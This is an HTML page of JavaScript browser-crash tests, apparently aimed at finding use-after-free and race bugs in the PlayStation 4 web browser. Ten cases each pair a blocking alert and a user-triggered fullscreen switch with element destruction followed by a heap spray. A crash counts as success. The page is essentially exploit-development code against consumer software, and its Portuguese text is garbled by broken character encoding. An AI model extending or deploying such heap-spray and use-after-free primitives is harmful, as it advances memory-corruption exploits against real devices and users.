
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v200000: Native Modals</title>
<style>
    body { background-color: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 15px; text-align: center; }
    h1 { border-bottom: 2px solid #0f0; padding-bottom: 10px; }
    .btn { 
        display: block; width: 100%; padding: 18px; margin: 10px 0; 
        background: #020; color: #fff; border: 1px solid #0f0; 
        font-size: 18px; cursor: pointer; text-transform: uppercase; font-weight: bold;
    }
    .btn:hover { background: #0f0; color: #000; }
    #status { margin-top: 20px; color: #ff0; border: 1px dashed #ff0; padding: 10px; }
    
    /* Elementos Alvo */
    .target { width: 100px; height: 100px; background: red; margin: 0 auto; }
</style>
</head>
<body>

<h1>v200000: NATIVE MODAL TRAPS</h1>
<div id="status">Selecione um teste. Quando a janela aparecer, ative o Fullscreen (Quadrado)!</div>

<button class="btn" onclick="trap(m01)">01. Alert -> Body Destruction</button>
<button class="btn" onclick="trap(m02)">02. Confirm -> Canvas Resize Race</button>
<button class="btn" onclick="trap(m03)">03. Prompt -> History Back Navigation</button>
<button class="btn" onclick="trap(m04)">04. Alert -> CSS Media Query Switch</button>
<button class="btn" onclick="trap(m05)">05. Alert -> Iframe Context Kill</button>
<button class="btn" onclick="trap(m06)">06. Alert -> Video Player Conflict</button>
<button class="btn" onclick="trap(m07)">07. Alert -> Focus Blur UAF</button>
<button class="btn" onclick="trap(m08)">08. Confirm -> SVG Layout Thrash</button>
<button class="btn" onclick="trap(m09)">09. Alert -> Scroll Position Race</button>
<button class="btn" onclick="trap(m10)">10. Alert -> Recursive Modal Stack</button>

<script>
    const S = document.getElementById('status');

    function trap(func) {
        S.innerText = "PREPARANDO MEM칍RIA...";
        
        // 1. Configura칞칚o do Cen치rio
        const el = func(); 

        // Pequeno delay para garantir que o elemento foi renderizado antes do alerta travar a thread
        setTimeout(() => {
            // 2. A Janela Nativa (Bloqueio de Thread)
            // O usu치rio deve apertar QUADRADO enquanto esta janela estiver na tela
            window.alert("丘멆잺 AGORA!!! 丘멆잺\n\n1. N츾O FECHE ESTA JANELA AINDA.\n2. APERTE O BOT츾O DE TELA CHEIA (QUADRADO) NO CONTROLE.\n3. DEPOIS QUE A TELA MUDAR, APERTE X PARA FECHAR ESTE AVISO.");

            // 3. A Execu칞칚o P칩s-Bloqueio (O Golpe)
            // Assim que o alerta fecha (ou o fullscreen for칞a o fechamento), isso roda:
            S.innerText = "游눤 DETONANDO OBJETOS...";
            
            if (el && el._kill) {
                try {
                    el._kill(); // Destr칩i o objeto que est치 sendo redimensionado
                } catch(e) {}
            }
            
            // Heap Spray r치pido para ocupar o espa칞o liberado
            const spray = [];
            for(let i=0; i<1000; i++) spray.push(new Uint8Array(4096).fill(0x41));
            
            S.innerText = "Teste conclu칤do. Se o navegador n칚o fechou, falhou.";
        }, 100);
    }

    // =================================================================
    // 01. Body Destruction
    // Remove o pr칩prio corpo da p치gina assim que o fullscreen ativa.
    // =================================================================
    function m01() {
        const d = document.createElement('div');
        d.className = 'target';
        d.innerHTML = "<h1>ALVO GLOBAL</h1>";
        document.body.appendChild(d);
        
        d._kill = () => {
            document.body.innerHTML = ""; // Nuke total
            document.write("CRASH?"); 
        };
        return d;
    }

    // =================================================================
    // 02. Canvas Resize Race
    // O fullscreen for칞a o redimensionamento do canvas. N칩s o destru칤mos no processo.
    // =================================================================
    function m02() {
        const c = document.createElement('canvas');
        c.className = 'target';
        const ctx = c.getContext('2d');
        ctx.fillStyle = 'blue'; ctx.fillRect(0,0,100,100);
        document.body.appendChild(c);

        c._kill = () => {
            c.width = 0; // Reseta mem칩ria interna
            c.remove();  // Remove do DOM
        };
        return c;
    }

    // =================================================================
    // 03. History Back Navigation
    // Navega para tr치s no hist칩rico no exato momento da transi칞칚o visual.
    // =================================================================
    function m03() {
        history.pushState({}, "trap", "#trap");
        const d = document.createElement('div');
        d.innerText = "Navegando...";
        document.body.appendChild(d);
        
        d._kill = () => {
            history.back(); // For칞a mudan칞a de p치gina durante renderiza칞칚o
        };
        return d;
    }

    // =================================================================
    // 04. CSS Media Query Switch
    // Usa CSS que reage ao tamanho da tela. Ao mudar para fullscreen,
    // o CSS muda, e n칩s removemos o elemento que o CSS estava aplicando.
    // =================================================================
    function m04() {
        const style = document.createElement('style');
        style.textContent = "@media screen and (min-width: 1000px) { .target { background: green; transform: scale(2); } }";
        document.head.appendChild(style);
        
        const d = document.createElement('div');
        d.className = 'target';
        document.body.appendChild(d);
        
        d._kill = () => {
            style.remove(); // Remove as regras CSS
            d.remove();     // Remove o elemento
        };
        return d;
    }

    // =================================================================
    // 05. Iframe Context Kill
    // Coloca um iframe, pede fullscreen, e mata o iframe ao retomar.
    // =================================================================
    function m05() {
        const ifr = document.createElement('iframe');
        ifr.className = 'target';
        document.body.appendChild(ifr);
        
        ifr._kill = () => {
            ifr.src = "about:blank"; // Navega칞칚o s칤ncrona
            setTimeout(() => ifr.remove(), 0);
        };
        return ifr;
    }

    // =================================================================
    // 06. Video Player Conflict
    // O PS4 usa player nativo. Conflito entre janela de alerta e overlay de v칤deo.
    // =================================================================
    function m06() {
        const v = document.createElement('video');
        v.className = 'target';
        v.controls = true;
        // Blob inv치lido para for칞ar estado de erro/carregamento
        v.src = URL.createObjectURL(new Blob([""], {type:'video/mp4'}));
        document.body.appendChild(v);
        
        v._kill = () => {
            v.load(); // Reseta o media player
            v.remove();
        };
        return v;
    }

    // =================================================================
    // 07. Focus Blur UAF
    // Foca num input. O alerta rouba o foco. O fullscreen muda o layout.
    // Na volta, tentamos acessar o input que perdeu foco.
    // =================================================================
    function m07() {
        const i = document.createElement('input');
        i.className = 'target';
        i.value = "FOCADO";
        document.body.appendChild(i);
        i.focus();
        
        i._kill = () => {
            i.remove(); // Remove o elemento que tinha foco
            // Tenta for칞ar o navegador a restaurar foco para o vazio
            document.body.tabIndex = 0;
            document.body.focus();
        };
        return i;
    }

    // =================================================================
    // 08. SVG Layout Thrash
    // Redimensionamento de SVG complexo.
    // =================================================================
    function m08() {
        const div = document.createElement('div');
        div.innerHTML = '<svg width="100" height="100"><circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" /></svg>';
        div.className = 'target';
        document.body.appendChild(div);
        
        div._kill = () => {
            // Invalida atributos SVG cr칤ticos
            div.firstChild.setAttribute("width", "0%");
            div.remove();
        };
        return div;
    }

    // =================================================================
    // 09. Scroll Position Race
    // Cria p치gina longa, rola para baixo. Alerta.
    // Na volta (fullscreen reseta scroll?), remove conte칰do.
    // =================================================================
    function m09() {
        const d = document.createElement('div');
        d.style.height = "5000px";
        d.style.background = "linear-gradient(red, blue)";
        document.body.appendChild(d);
        window.scrollTo(0, 2000);
        
        d._kill = () => {
            window.scrollTo(0, 0); // Conflito de scroll
            d.remove();
        };
        return d;
    }

    // =================================================================
    // 10. Recursive Modal Stack
    // Abre outro alerta imediatamente ap칩s o primeiro, confundindo o foco do Fullscreen.
    // =================================================================
    function m10() {
        const d = document.createElement('div');
        d.innerText = "Recursion";
        document.body.appendChild(d);
        
        d._kill = () => {
            // Abre um segundo modal imediatamente
            // Isso pode travar a UI se o Fullscreen estiver tentando assumir o controle
            window.alert("SEGUNDO BLOQUEIO: O Fullscreen funcionou?");
        };
        return d;
    }
</script>

</body>
</html>
